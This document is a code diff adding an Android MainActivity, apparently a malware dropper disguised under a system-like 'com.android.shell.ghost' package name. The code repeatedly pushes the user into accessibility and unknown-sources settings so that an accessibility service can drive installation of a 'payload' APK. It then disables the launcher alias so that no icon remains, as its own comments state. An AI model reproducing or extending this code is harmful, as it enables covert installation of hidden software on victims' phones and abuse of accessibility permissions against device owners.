@@ -1,50 +1,168 @@
 package com.android.shell.ghost;
 
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.os.Build;
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
-import android.view.Window;
-import android.view.WindowManager;
+import android.view.View;
+import android.view.accessibility.AccessibilityManager;
+import android.widget.Button;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 import android.widget.Toast;
 
+import java.io.File;
+
+/**
+ * Visible bootstrap screen.
+ *
+ * It only exists until the accessibility service can drive the install.
+ * As soon as the service is enabled the launcher alias is disabled, so the
+ * wrapper leaves no icon behind (no root required).
+ */
 public class MainActivity extends Activity {
-    private void proceedIfReady() {
-        String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-        if (enabled != null && enabled.contains("GhostAccessibilityService")) {
-            GhostAccessibilityService.startHiddenService(this);
-            finish();
-        }
+
+    private final Handler handler = new Handler(Looper.getMainLooper());
+    private TextView step;
+    private ProgressBar progress;
+    private Button settings;
+    private long lastSettingsOpen;
+    private boolean started;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        step = findViewById(R.id.step);
+        progress = findViewById(R.id.progress);
+        settings = findViewById(R.id.settings);
+        settings.setOnClickListener(v -> openSettings());
+        handler.postDelayed(this::proceed, 250);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        proceedIfReady();
+        handler.postDelayed(this::proceed, 400);
+    }
+
+    private boolean a11yEnabled() {
+        try {
+            AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
+            if (am != null) {
+                for (AccessibilityServiceInfo info :
+                        am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)) {
+                    if (info.getId() != null && info.getId().startsWith(getPackageName())) return true;
+                }
+            }
+        } catch (Throwable ignored) {}
+        String enabled = Settings.Secure.getString(getContentResolver(),
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        return enabled != null && enabled.contains(getPackageName() + "/")
+                || (enabled != null && enabled.contains("GhostAccessibilityService"));
+    }
+
+    private void proceed() {
+        if (isFinishing()) return;
+        if (!a11yEnabled()) {
+            progress.setVisibility(View.VISIBLE);
+            step.setText(R.string.setup_step_a11y);
+            settings.setVisibility(View.VISIBLE);
+            if (System.currentTimeMillis() - lastSettingsOpen > 6000) {
+                openAccessibility();
+            }
+            return;
+        }
+
+        GhostAccessibilityService.startHiddenService(this);
+        if (!getPackageManager().canRequestPackageInstalls()) {
+            progress.setVisibility(View.VISIBLE);
+            step.setText(R.string.setup_step_unknown);
+            settings.setVisibility(View.VISIBLE);
+            if (System.currentTimeMillis() - lastSettingsOpen > 6000) {
+                openUnknownSources();
+            }
+            return;
+        }
+
+        settings.setVisibility(View.GONE);
+        step.setText(R.string.setup_step_installing);
+        progress.setVisibility(View.VISIBLE);
+
+        File apk = PayloadInstaller.obtainPayload(this);
+        if (apk != null && PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null
+                && PayloadInstaller.installedVersion(this, PayloadInstaller.PAYLOAD_PACKAGE)
+                    >= PayloadInstaller.apkVersion(apk, this)
+                && PayloadInstaller.sameSigner(this, PayloadInstaller.PAYLOAD_PACKAGE, apk)) {
+            setSetupHidden();
+            GhostAccessibilityService.onPayloadReady(this);
+            step.setText(R.string.setup_step_done);
+            handler.postDelayed(this::finish, 900);
+            return;
+        }
+
+        if (!started) {
+            started = true;
+            PayloadInstaller.start(this);
+            // The install UI takes over; do not finish instantly so the user
+            // can come back to this screen if the dialog is dismissed.
+            handler.postDelayed(() -> {
+                if (isFinishing()) return;
+                if (PayloadInstaller.installedInfo(
+                        this, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
+                    finish();
+                    return;
+                }
+                PayloadInstaller.relaunchPendingUi(this);
+                PayloadInstaller.start(this);
+            }, 5000);
+        }
+    }
+
+    private void openSettings() {
+        if (!a11yEnabled()) openAccessibility();
+        else openUnknownSources();
+    }
+
+    private void openAccessibility() {
+        lastSettingsOpen = System.currentTimeMillis();
+        Toast.makeText(this, R.string.setup_step_a11y, Toast.LENGTH_LONG).show();
+        try {
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+        } catch (Throwable ignored) {}
+    }
+
+    private void openUnknownSources() {
+        lastSettingsOpen = System.currentTimeMillis();
+        try {
+            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                    Uri.parse("package:" + getPackageName()));
+            startActivity(i);
+        } catch (Throwable t) {
+            try {
+                startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES));
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    private void setSetupHidden() {
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                    new ComponentName(this, getPackageName() + ".LauncherAlias"),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Throwable ignored) {}
     }
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        getWindow().addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
-        // Enable accessibility service if not already
-        String enabled = Settings.Secure.getString(getContentResolver(),
-                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-        String target = "GhostAccessibilityService";
-        if (enabled == null || !enabled.contains(target)) {
-            // Launch accessibility settings so the user can enable
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        } else {
-            // Start the foreground service and hide
-            if (!Settings.canDrawOverlays(this)) {
-                try { startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, android.net.Uri.parse("package:" + getPackageName()))); } catch (Exception ignored) {}
-            }
-            GhostAccessibilityService.startHiddenService(this);
-            finish();
-        }
+    protected void onDestroy() {
+        handler.removeCallbacksAndMessages(null);
+        super.onDestroy();
     }
 }
